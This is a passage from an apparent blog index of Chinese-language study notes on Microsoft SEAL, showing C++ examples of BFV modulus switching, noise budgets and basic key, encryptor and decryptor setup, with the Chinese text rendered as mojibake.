punctuation">(</span>context_data<span class="token operator">-></span><span class="token function">next_context_data</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        cout <span class="token operator">&lt;&lt;</span> <span class="token string">" Level (chain index): "</span> <span class="token operator">&lt;&lt;</span> context_data<span class="token operator">-></span><span class="token function">chain_index</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>        cout <span class="token operator">&lt;&lt;</span> <span class="token string">"      parms_id of encrypted: "</span> <span class="token operator">&lt;&lt;</span> encrypted<span class="token punctuation">.</span><span class="token function">parms_id</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>        cout <span class="token operator">&lt;&lt;</span> <span class="token string">"      Noise budget at this level: "</span> <span class="token operator">&lt;&lt;</span> decryptor<span class="token punctuation">.</span><span class="token function">invariant_noise_budget</span><span class="token punctuation">(</span>encrypted<span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token string">" bits"</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>        cout <span class="token operator">&lt;&lt;</span> <span class="token string">"\\"</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>        cout <span class="token operator">&lt;&lt;</span> <span class="token string">" \\-->"</span><span class="token punctuation">;</span>        evaluator<span class="token punctuation">.</span><span class="token function">mod_switch_to_next_inplace</span><span class="token punctuation">(</span>encrypted<span class="token punctuation">)</span><span class="token punctuation">;</span>        context_data <span class="token operator">=</span> context_data<span class="token operator">-></span><span class="token function">next_context_data</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    cout <span class="token operator">&lt;&lt;</span> <span class="token string">" Level (chain index): "</span> <span class="token operator">&lt;&lt;</span> context_data<span class="token operator">-></span><span class="token function">chain_index</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>    cout <span class="token operator">&lt;&lt;</span> <span class="token string">"      parms_id of encrypted: "</span> <span class="token operator">&lt;&lt;</span> encrypted<span class="token punctuation">.</span><span class="token function">parms_id</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>    cout <span class="token operator">&lt;&lt;</span> <span class="token string">"      Noise budget at this level: "</span> <span class="token operator">&lt;&lt;</span> decryptor<span class="token punctuation">.</span><span class="token function">invariant_noise_budget</span><span class="token punctuation">(</span>encrypted<span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token string">" bits"</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>    cout <span class="token operator">&lt;&lt;</span> <span class="token string">"\\"</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>    cout <span class="token operator">&lt;&lt;</span> <span class="token string">" \\-->"</span><span class="token punctuation">;</span>    cout <span class="token operator">&lt;&lt;</span> <span class="token string">" End of chain reached"</span> <span class="token operator">&lt;&lt;</span> endl <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>    <span class="token comment">/*    åœ¨è¿™ä¸€ç‚¹ä¸Šï¼Œå¾ˆéš¾çœ‹åˆ°è¿™æ ·åšæœ‰ä»»ä½•å¥½å¤„:æˆ‘ä»¬æŸå¤±äº†å·¨å¤§å™ªéŸ³é¢„ç®—(å³è®¡ç®—èƒ½åŠ›)æ²¡æœ‰ä»»ä½•å›æŠ¥ã€‚    è§£å¯†ä»èƒ½å·¥ä½œã€‚    ç„¶è€Œï¼Œæœ‰ä¸€ä¸ªéšè—çš„å¥½å¤„:å¯†æ–‡çš„å¤§å°å–å†³äºç³»æ•°æ¨¡æ•°ä¸­ç´ æ•°æ•°çš„çº¿æ€§å…³ç³»ã€‚    å› æ­¤,å¦‚æœæœ‰ä¸éœ€è¦æˆ–ä¸æ‰“ç®—å¯¹ç»™å®šçš„å¯¹è±¡æ‰§è¡Œä»»ä½•è¿›ä¸€æ­¥çš„è®¡ç®—å¯†æ–‡ï¼Œ    æˆ‘ä»¬ä¸å¦¨æŠŠå®ƒåˆ‡æ¢åˆ°æœ€å°çš„(æœ€åçš„)é›†åˆå‚æ•°ï¼Œç„¶åå°†å…¶å‘é€å›å¯†é’¥æŒæœ‰è€…è§£å¯†ã€‚    æ­¤å¤–ï¼Œå™ªéŸ³æŸå¤±é¢„ç®—å®é™…ä¸Šæ ¹æœ¬ä¸æ˜¯ä¸€ä¸ªé—®é¢˜        */</span>    <span class="token function">print_line</span><span class="token punctuation">(</span><span class="token constant">__LINE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    cout <span class="token operator">&lt;&lt;</span> <span class="token string">"Decrypt still works after modulus switching."</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>    decryptor<span class="token punctuation">.</span><span class="token function">decrypt</span><span class="token punctuation">(</span>encrypted<span class="token punctuation">,</span> plain<span class="token punctuation">)</span><span class="token punctuation">;</span>    cout <span class="token operator">&lt;&lt;</span> <span class="token string">"    + Decryption of encrypted: "</span> <span class="token operator">&lt;&lt;</span> plain<span class="token punctuation">.</span><span class="token function">to_string</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    cout <span class="token operator">&lt;&lt;</span> <span class="token string">" ...... Correct."</span> <span class="token operator">&lt;&lt;</span> endl <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>    <span class="token comment">/*    * å› æ­¤,å¦‚æœæœ‰ä¸éœ€è¦æˆ–ä¸æ‰“ç®—å¯¹ç»™å®šçš„å¯¹è±¡æ‰§è¡Œä»»ä½•è¿›ä¸€æ­¥çš„è®¡ç®—å¯†æ–‡ï¼Œ    * æˆ‘ä»¬ä¸å¦¨æŠŠå®ƒåˆ‡æ¢åˆ°æœ€å°çš„(æœ€åçš„)é›†åˆå‚æ•°ï¼Œç„¶åå°†å…¶å‘é€å›å¯†é’¥æŒæœ‰è€…è§£å¯†ã€‚    * æ­¤å¤–ï¼Œå™ªéŸ³æŸå¤±é¢„ç®—å®é™…ä¸Šæ ¹æœ¬ä¸æ˜¯ä¸€ä¸ªé—®é¢˜    * é¦–å…ˆï¼Œæˆ‘ä»¬é‡æ–°åˆ›å»ºåŸå§‹å¯†æ–‡å¹¶æ‰§è¡Œä¸€äº›è®¡ç®—ã€‚    *     */</span>    cout <span class="token operator">&lt;&lt;</span> <span class="token string">"Computation is more efficient with modulus switching."</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>    <span class="token function">print_line</span><span class="token punctuation">(</span><span class="token constant">__LINE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    cout <span class="token operator">&lt;&lt;</span> <span class="token string">"Compute the 8th power."</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>    encryptor<span class="token punctuation">.</span><span class="token function">encrypt</span><span class="token punctuation">(</span>plain<span class="token punctuation">,</span> encrypted<span class="token punctuation">)</span><span class="token punctuation">;</span>    cout <span class="token operator">&lt;&lt;</span> <span class="token string">"    + Noise budget fresh:                   "</span> <span class="token operator">&lt;&lt;</span> decryptor<span class="token punctuation">.</span><span class="token function">invariant_noise_budget</span><span class="token punctuation">(</span>encrypted<span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token string">" bits"</span>        <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>    evaluator<span class="token punctuation">.</span><span class="token function">square_inplace</span><span class="token punctuation">(</span>encrypted<span class="token punctuation">)</span><span class="token punctuation">;</span>    evaluator<span class="token punctuation">.</span><span class="token function">relinearize_inplace</span><span class="token punctuation">(</span>encrypted<span class="token punctuation">,</span> relin_keys<span class="token punctuation">)</span><span class="token punctuation">;</span>    cout <span class="token operator">&lt;&lt;</span> <span class="token string">"    + Noise budget of the 2nd power:         "</span> <span class="token operator">&lt;&lt;</span> decryptor<span class="token punctuation">.</span><span class="token function">invariant_noise_budget</span><span class="token punctuation">(</span>encrypted<span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token string">" bits"</span>        <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>    evaluator<span class="token punctuation">.</span><span class="token function">square_inplace</span><span class="token punctuation">(</span>encrypted<span class="token punctuation">)</span><span class="token punctuation">;</span>    evaluator<span class="token punctuation">.</span><span class="token function">relinearize_inplace</span><span class="token punctuation">(</span>encrypted<span class="token punctuation">,</span> relin_keys<span class="token punctuation">)</span><span class="token punctuation">;</span>    cout <span class="token operator">&lt;&lt;</span> <span class="token string">"    + Noise budget of the 4th power:         "</span> <span class="token operator">&lt;&lt;</span> decryptor<span class="token punctuation">.</span><span class="token function">invariant_noise_budget</span><span class="token punctuation">(</span>encrypted<span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token string">" bits"</span>        <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>    <span class="token comment">/*    åœ¨è¿™ç§æƒ…å†µä¸‹ modulus switching å¯¹å™ªå£°é¢„ç®—å®Œå…¨æ²¡æœ‰å½±å“ã€‚    */</span>    evaluator<span class="token punctuation">.</span><span class="token function">mod_switch_to_next_inplace</span><span class="token punctuation">(</span>encrypted<span class="token punctuation">)</span><span class="token punctuation">;</span>    cout <span class="token operator">&lt;&lt;</span> <span class="token string">"    + Noise budget after modulus switching:  "</span> <span class="token operator">&lt;&lt;</span> decryptor<span class="token punctuation">.</span><span class="token function">invariant_noise_budget</span><span class="token punctuation">(</span>encrypted<span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token string">" bits"</span>        <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>    <span class="token comment">/*    * è¿™æ„å‘³ç€é™ä½ä¸€äº›ç³»æ•°æ˜¯æ²¡æœ‰ä»»ä½•å®³å¤„çš„åœ¨åšäº†è¶³å¤Ÿçš„è®¡ç®—ä¹‹åã€‚    * åœ¨æŸäº›æƒ…å†µä¸‹ï¼Œäººä»¬å¯èƒ½ç¨å¾®æ—©ä¸€ç‚¹åˆ‡æ¢åˆ°ä¸€ä¸ªè¾ƒä½çš„çº§åˆ«ï¼Œå®é™…ä¸Šç‰ºç‰²äº†ä¸€äº›è¿‡ç¨‹ä¸­çš„å™ªéŸ³é¢„ç®—    * ä»¥ç”¨æ›´å°çš„å‚æ•°æ¥è·å¾—è®¡ç®—æ€§èƒ½    * æˆ‘ä»¬ä»æ‰“å°å‡ºæ¥çš„æ•°æ®ä¸­å¯ä»¥çœ‹åˆ°ï¼Œå½“å™ªéŸ³é¢„ç®—é™åˆ°25ä½å·¦å³æ—¶ï¼Œä¸‹ä¸€ä¸ªmodulus switchåº”è¯¥ç†æƒ³åœ°å®Œæˆã€‚    */</span>    evaluator<span class="token punctuation">.</span><span class="token function">square_inplace</span><span class="token punctuation">(</span>encrypted<span class="token punctuation">)</span><span class="token punctuation">;</span>    evaluator<span class="token punctuation">.</span><span class="token function">relinearize_inplace</span><span class="token punctuation">(</span>encrypted<span class="token punctuation">,</span> relin_keys<span class="token punctuation">)</span><span class="token punctuation">;</span>    cout <span class="token operator">&lt;&lt;</span> <span class="token string">"    + Noise budget of the 8th power:         "</span> <span class="token operator">&lt;&lt;</span> decryptor<span class="token punctuation">.</span><span class="token function">invariant_noise_budget</span><span class="token punctuation">(</span>encrypted<span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token string">" bits"</span>        <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>    evaluator<span class="token punctuation">.</span><span class="token function">mod_switch_to_next_inplace</span><span class="token punctuation">(</span>encrypted<span class="token punctuation">)</span><span class="token punctuation">;</span>    cout <span class="token operator">&lt;&lt;</span> <span class="token string">"    + Noise budget after modulus switching:  "</span> <span class="token operator">&lt;&lt;</span> decryptor<span class="token punctuation">.</span><span class="token function">invariant_noise_budget</span><span class="token punctuation">(</span>encrypted<span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token string">" bits"</span>        <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>    <span class="token comment">/*    * æ­¤æ—¶ï¼Œå¯†æ–‡ä»èƒ½æ­£ç¡®è§£å¯†ï¼Œä½“ç§¯å¾ˆå°ï¼Œè€Œä¸”è®¡ç®—æ•ˆç‡ä¹Ÿå°½å¯èƒ½é«˜ã€‚    * æ³¨æ„ï¼Œè§£å¯†å™¨å¯ä»¥ç”¨æ¥è§£å¯†åœ¨modulus switchingé“¾ä¸­ä»»æ„å±‚æ¬¡ä¸€ä¸ªå¯†æ–‡    */</span>    decryptor<span class="token punctuation">.</span><span class="token function">decrypt</span><span class="token punctuation">(</span>encrypted<span class="token punctuation">,</span> plain<span class="token punctuation">)</span><span class="token punctuation">;</span>    cout <span class="token operator">&lt;&lt;</span> <span class="token string">"    + Decryption of the 8th power (hexadecimal) ...... Correct."</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>    cout <span class="token operator">&lt;&lt;</span> <span class="token string">"    "</span> <span class="token operator">&lt;&lt;</span> plain<span class="token punctuation">.</span><span class="token function">to_string</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> endl <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>    <span class="token comment">/*    * åœ¨BFVä¸­ä¸éœ€è¦modulus switching    * åœ¨æŸäº›æƒ…å†µä¸‹ï¼Œç”¨æˆ·å¯èƒ½ä¼šä¸æƒ³åˆ›å»ºmodulus switchingé“¾ï¼Œ    * åªå®ç°æœ€é«˜çš„ä¸¤ä¸ªlevelï¼ˆkey level and highest data level)    * è¿™å¯ä»¥é€šè¿‡å°†boolå€¼' false'ä¼ é€’ç»™SEALContextçš„æ„é€ å‡½æ•°æ¥å®ç°ã€‚    */</span>    context <span class="token operator">=</span> <span class="token function">SEALContext</span><span class="token punctuation">(</span>parms<span class="token punctuation">,</span> false<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">/*    * æˆ‘ä»¬å¯ä»¥æ£€æŸ¥ç¡®å®åªåˆ›å»ºäº†æ¨¡æ•°äº¤æ¢é“¾æœ€é«˜çš„ä¸¤å±‚    */</span>    cout <span class="token operator">&lt;&lt;</span> <span class="token string">"Optionally disable modulus switching chain expansion."</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>    <span class="token function">print_line</span><span class="token punctuation">(</span><span class="token constant">__LINE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    cout <span class="token operator">&lt;&lt;</span> <span class="token string">"Print the modulus switching chain."</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>    cout <span class="token operator">&lt;&lt;</span> <span class="token string">"---->"</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span>context_data <span class="token operator">=</span> context<span class="token punctuation">.</span><span class="token function">key_context_data</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> context_data<span class="token punctuation">;</span> context_data <span class="token operator">=</span> context_data<span class="token operator">-></span><span class="token function">next_context_data</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        cout <span class="token operator">&lt;&lt;</span> <span class="token string">" Level (chain index): "</span> <span class="token operator">&lt;&lt;</span> context_data<span class="token operator">-></span><span class="token function">chain_index</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>        cout <span class="token operator">&lt;&lt;</span> <span class="token string">"      parms_id: "</span> <span class="token operator">&lt;&lt;</span> context_data<span class="token operator">-></span><span class="token function">parms_id</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>        cout <span class="token operator">&lt;&lt;</span> <span class="token string">"      coeff_modulus primes: "</span><span class="token punctuation">;</span>        cout <span class="token operator">&lt;&lt;</span> hex<span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">auto</span><span class="token operator">&amp;</span> prime <span class="token operator">:</span> context_data<span class="token operator">-></span><span class="token function">parms</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">coeff_modulus</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            cout <span class="token operator">&lt;&lt;</span> prime<span class="token punctuation">.</span><span class="token function">value</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token string">" "</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        cout <span class="token operator">&lt;&lt;</span> dec <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>        cout <span class="token operator">&lt;&lt;</span> <span class="token string">"\\"</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>        cout <span class="token operator">&lt;&lt;</span> <span class="token string">" \\-->"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    cout <span class="token operator">&lt;&lt;</span> <span class="token string">" End of chain reached"</span> <span class="token operator">&lt;&lt;</span> endl <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre>              </div>            </details></div>]]></content>
      
      
      <categories>
          
          <category> æŠ€æœ¯å‘ </category>
          
          <category> Microsoft SEAL </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Seal </tag>
            
            <tag> åŒæ€åŠ å¯† </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SEALå­¦ä¹ ç¬¬ä¸€å¤©-Bfv_basicsä½¿ç”¨ç”¨æ³•</title>
      <link href="/posts/9959b7cc/"/>
      <url>/posts/9959b7cc/</url>
      
        <content type="html"><![CDATA[<blockquote><p>@auther by sizaif</p></blockquote><h1>SEALå­¦ä¹ ç¬¬ä¸€å¤©ï¼š bfv_basicsä½¿ç”¨ç”¨æ³•</h1><p>@<a href="%E7%9B%AE%E5%BD%95">TOC</a></p><h1>bfv_basics</h1><h2 id="ä¸€-parmsç±»">ä¸€ parmsç±»</h2><div class="story post-story"><blockquote><p>åˆ›å»ºä¸€ä¸ªHEæ–¹æ¡ˆç±»</p><p>parmsç±»éœ€è¦çš„3ä¸ªå‚æ•°</p><ul><li>poly_modulus_degree (degree of polynomial modulus å¤šé¡¹å¼æ¨¡çš„æ¬¡æ•°);</li><li>coeff_modulus ([ciphertext] coefficient modulus ç³»æ•°æ¨¡);</li><li>plain_modulus (plaintext modulus; only for the BFV scheme).  MOD X, å°†ç»“æœMODåˆ°Xå†…</li></ul></blockquote><table><thead><tr><th>ç”¨æ³•</th><th>å‚æ•°</th><th>è§£é‡Šè¯´æ˜</th></tr></thead><tbody><tr><td>EncryptionParameters parms();</td><td>scheme_type::bfv</td><td>åˆ›å»ºä¸€ä¸ªHEä»¥BFVæ–¹æ¡ˆç±»</td></tr><tr><td>size_t poly_modulus_degree = 4096;</td><td>integear</td><td>[size_t poly_modulus_degree](###size_t poly_modulus_degree)</td></tr><tr><td>parms.set_poly_modulus_degree();</td><td>poly_modulus_degree</td><td></td></tr><tr><td>parms.set_coeff_modulus()ï¼›</td><td>CoeffModulus::BFVDefault(poly_modulus_degree)</td><td><a href="###coeff_modulus">poly_modulus_degree</a></td></tr><tr><td>parms.set_plain_modulus(1024);</td><td>integear</td><td><a href="###MOD">MOD</a></td></tr><tr><td>context.parameter_error_message()</td><td></td><td>è¾“å‡ºæŠ¥é”™ä¿¡æ¯</td></tr><tr><td>SEALContext context(parms);</td><td></td><td><a href="####%E6%BC%94%E7%A4%BAcode">åˆ›å»ºSEALContextç±»</a></td></tr></tbody></table><p><strong>EncryptionParameters parms(scheme_type::bfv);</strong></p><pre><code>The BFV scheme cannot perform arbitrary computations on encrypted data.Instead, each ciphertext has a specific quantity called the `invariant noisebudget' -- or `noise budget' for short -- measured in bits. The noise budgetin a freshly encrypted ciphertext (initial noise budget) is determined bythe encryption parameters. Homomorphic operations consume the noise budgetat a rate also determined by the encryption parameters. In BFV the two basicoperations allowed on encrypted data are additions and multiplications, ofwhich additions can generally be thought of as being nearly free in terms ofnoise budget consumption compared to multiplications. Since noise budgetconsumption compounds in sequential multiplications, the most significantfactor in choosing appropriate encryption parameters is the multiplicativedepth of the arithmetic circuit that the user wants to evaluate on encrypteddata. Once the noise budget of a ciphertext reaches zero it becomes toocorrupted to be decrypted. Thus, it is essential to choose the parameters tobe large enough to support the desired computation; otherwise the result isimpossible to make sense of even with the secret key.åŸºæœ¬è¿ç®—: åŠ æ³• å’Œä¹˜æ³• In BFV the two basic operations allowed on encrypted data are additions and multiplications</code></pre><p>åŸºæœ¬è¿ç®—: åŠ æ³• å’Œä¹˜æ³•</p><p><strong>size_t poly_modulus_degree = 4096;</strong></p><h3 id="size-t-poly-modulus-degree">size_t poly_modulus_degree</h3><p>å¤šé¡¹å¼æ¨¡â€çš„æ¬¡æ•°,2çš„å€æ•°;1024, 2048, 4096, 8192, 16384, 32768,</p><p><strong>parms.set_poly_modulus_degree(poly_modulus_degree);</strong></p><p><strong>parms.set_coeff_modulus(CoeffModulus::BFVDefault(poly_modulus_degree));</strong></p><h3 id="coeff-modulus">coeff_modulus</h3><details green><summary> code </summary>              <div class='content'>              <p>[ciphertext] `coefficient modulusâ€™ (coeff_modulus) [å¯†æ–‡]â€˜ç³»æ•°æ¨¡é‡â€™ (coeff_modulus)</p><p>Microsoft SEAL comes with helper functions for selecting the coeff_modulus.<br>For new users the easiest way is to simply use<br>ç®€å•è°ƒç”¨:<br>CoeffModulus::BFVDefault(poly_modulus_degree),<br>è¿”å›vectorç±»å‹<br>which returns std::vector<Modulus> consisting of a generally good choice<br>for the given poly_modulus_degree.<br>æ¨¡é•¿åº¦å¯¹åº”ç´ æ•°é•¿åº¦<br>Â±---------------------------------------------------+<br>| poly_modulus_degree | max coeff_modulus bit-length |<br>Â±--------------------Â±-----------------------------+<br>| 1024                | 27                           |<br>| 2048                | 54                           |<br>| 4096                | 109                          |<br>| 8192                | 218                          |<br>| 16384               | 438                          |<br>| 32768               | 881                          |<br>Â±--------------------Â±-----------------------------+</p>              </div>            </details><p><strong>parms.set_plain_modulus(1024);</strong></p><h3 id="MOD">MOD</h3><pre><code>    ~ log2(coeff_modulus/plain_modulus) (bits)å™ªå£°é¢„ç®—è®¡ç®—æ–¹å¼:and the noise budget consumption in a homomorphic multiplication is of theform log2(plain_modulus) + (other terms).æ˜æ–‡æ¨¡é‡æ˜¯BFVæ ¼å¼ç‰¹æœ‰çš„ï¼Œä½¿ç”¨CKKSæ ¼å¼æ—¶ä¸èƒ½è®¾ç½®æ˜æ–‡æ¨¡é‡ã€‚</code></pre><p>æ—¢ç„¶æ‰€æœ‰å‚æ•°éƒ½è®¾ç½®å¥½äº†ï¼Œæˆ‘ä»¬å°±å¯ä»¥æ„å»ºä¸€ä¸ªSEALContextäº†<br>å¯¹è±¡ã€‚ç±»çš„æœ‰æ•ˆæ€§å’Œå±æ€§æ˜¯ä¸€ä¸ªé‡ç±» æˆ‘ä»¬åˆšåˆšè®¾ç½®çš„å‚æ•°ã€‚</p><h4 id="æ¼”ç¤ºcode">æ¼”ç¤ºcode</h4><pre class="language-c" data-language="c"><code class="language-c">   EncryptionParameters <span class="token function">parms</span><span class="token punctuation">(</span>scheme_type<span class="token operator">::</span>bfv<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//å£°æ˜HE ä½¿ç”¨çš„æ¨¡å¼</span>   <span class="token comment">// è®¾ç½® 3 ä¸ªå‚æ•°</span>   <span class="token class-name">size_t</span> poly_modulus_degree <span class="token operator">=</span> <span class="token number">4096</span><span class="token punctuation">;</span>   parms<span class="token punctuation">.</span><span class="token function">set_poly_modulus_degree</span><span class="token punctuation">(</span>poly_modulus_degree<span class="token punctuation">)</span><span class="token punctuation">;</span>   parms<span class="token punctuation">.</span><span class="token function">set_coeff_modulus</span><span class="token punctuation">(</span>CoeffModulus<span class="token operator">::</span><span class="token function">BFVDefault</span><span class="token punctuation">(</span>poly_modulus_degree<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   parms<span class="token punctuation">.</span><span class="token function">set_plain_modulus</span><span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// æ˜æ–‡ MODæ•° (2çš„å€æ•°, ç´ æ•°æœ€å¥½)</span>   <span class="token comment">//åˆ›å»ºä¸€ä¸ªcontext</span>   SEALContext <span class="token function">context</span><span class="token punctuation">(</span>parms<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//å½“ä½¿ç”¨å‚æ•°åˆ›å»ºSEALContextæ—¶ï¼ŒMicrosoft SEALå°†é¦–å…ˆåˆ›å»ºéªŒè¯è¿™äº›å‚æ•°ã€‚è¿™é‡Œé€‰æ‹©çš„å‚æ•°æ˜¯æœ‰æ•ˆçš„ã€‚</span>cout <span class="token operator">&lt;&lt;</span> <span class="token string">"Parameter validation (success): "</span> <span class="token operator">&lt;&lt;</span> context<span class="token punctuation">.</span><span class="token function">parameter_error_message</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span></code></pre></div><h2 id="äºŒ-KeyGeneratorç±»">äºŒ KeyGeneratorç±»</h2><div class="story post-story"><p>å…¬é’¥åŠ å¯†æ–¹æ¡ˆæœ‰ä¸€ä¸ªç”¨äºåŠ å¯†æ•°æ®çš„å•ç‹¬çš„å…¬é’¥ï¼Œå’Œä¸€ä¸ªç”¨äºè§£å¯†æ•°æ®çš„å•ç‹¬çš„ç§˜å¯†å¯†é’¥ã€‚</p><p>æˆ‘ä»¬éœ€è¦KeyGeneratorç±»çš„ä¸€ä¸ªå®ä¾‹ã€‚æ„é€ å¯†é’¥ç”Ÿæˆå™¨ä¼šè‡ªåŠ¨ç”Ÿæˆä¸€ä¸ªå¯†é’¥ã€‚ç„¶åï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨</p><p>KeyGenerator::create_public_keyä¸ºå®ƒåˆ›å»ºå°½å¯èƒ½å¤šçš„å…¬é’¥ã€‚</p><table><thead><tr><th>ç”¨æ³•</th><th>å‚æ•°</th><th>è§£é‡Šè¯´æ˜</th></tr></thead><tbody><tr><td>KeyGenerator keygen(context);</td><td>SEALContext</td><td>åˆ›å»ºä¸€ä¸ªé’¥åŒ™ç”Ÿæˆå™¨</td></tr><tr><td>SecretKey secret_key = keygen.secret_key();</td><td></td><td>åˆ›é€ ä¸€ä¸ªç§é’¥</td></tr><tr><td>PublicKey public_key;</td><td></td><td>å£°æ˜ä¸€ä¸ªå…¬é’¥</td></tr><tr><td>keygen.create_public_key(public_key);</td><td></td><td>åˆ›é€ ä¸€ä¸ªå…¬é’¥</td></tr><tr><td>Encryptor encryptor();</td><td>SEALContextï¼ŒPublicKey</td><td>æ„é€ Encryptorçš„ä¸€ä¸ªå®ä¾‹</td></tr><tr><td>Evaluator evaluator();</td><td>SEALContext</td><td>å¯¹å¯†æ–‡çš„è®¡ç®—ä½¿ç”¨Evaluatorç±»æ‰§è¡Œ</td></tr><tr><td>Decryptor decryptor();</td><td>SEALContextï¼ŒSecretKey</td><td>æ„é€ Decryptorç±»çš„ä¸€ä¸ªå®ä¾‹</td></tr><tr><td></td><td></td><td></td></tr></tbody></table> <pre class="language-none"><code class="language-none">Note that KeyGenerator::create_public_key has another overload that takesno parameters and returns a Serializable&lt;PublicKey&gt; object. We will discussthis in &#96;6_serialization.cpp&#39;.</code></pre><p>ä¸ºäº†èƒ½å¤ŸåŠ å¯†ï¼Œæˆ‘ä»¬éœ€è¦æ„é€ Encryptorçš„ä¸€ä¸ªå®ä¾‹,æ³¨æ„ï¼ŒåŠ å¯†å™¨åªéœ€è¦å…¬é’¥ï¼Œ</p><p>â€‹Encryptor encryptor(contest,public_key);</p><p>å¯¹å¯†æ–‡çš„è®¡ç®—ä½¿ç”¨Evaluatorç±»æ‰§è¡Œ,Evaluatorä¸ä¼šç”±æŒæœ‰å¯†é’¥çš„åŒä¸€æ–¹æ„é€ ã€‚</p><p>â€‹Evaluator evaluator(context);</p><p>å½“ç„¶ï¼Œæˆ‘ä»¬å¸Œæœ›å¯¹ç»“æœè¿›è¡Œè§£å¯†ï¼Œä»¥éªŒè¯ä¸€åˆ‡å·¥ä½œæ­£å¸¸ï¼Œå› æ­¤è¿˜éœ€è¦æ„é€ Decryptorç±»çš„ä¸€ä¸ªå®ä¾‹ã€‚æ³¨æ„ï¼Œè§£å¯†å™¨éœ€è¦å¯†é’¥ã€‚</p><p>â€‹Decryptor decryptor(context, secret_key);</p><h4 id="æ¼”ç¤ºcode-2">æ¼”ç¤ºcode</h4><details green><summary> code </summary>              <div class='content'>              <pre class="language-c" data-language="c"><code class="language-c">Ciphertext x_encrypted<span class="token punctuation">;</span> <span class="token comment">// å¯†æ–‡</span>encryptor<span class="token punctuation">.</span><span class="token function">encrypt</span><span class="token punctuation">(</span>x_plain<span class="token punctuation">,</span> x_encrypted<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// å°†æ˜æ–‡ x_plain åŠ å¯†è¾“å‡ºåˆ°å¯†æ–‡x_encryptedä¸Š</span>Plaintext x_decrypted<span class="token punctuation">;</span>decryptor<span class="token punctuation">.</span><span class="token function">decrypt</span><span class="token punctuation">(</span>x_encrypted<span class="token punctuation">,</span> 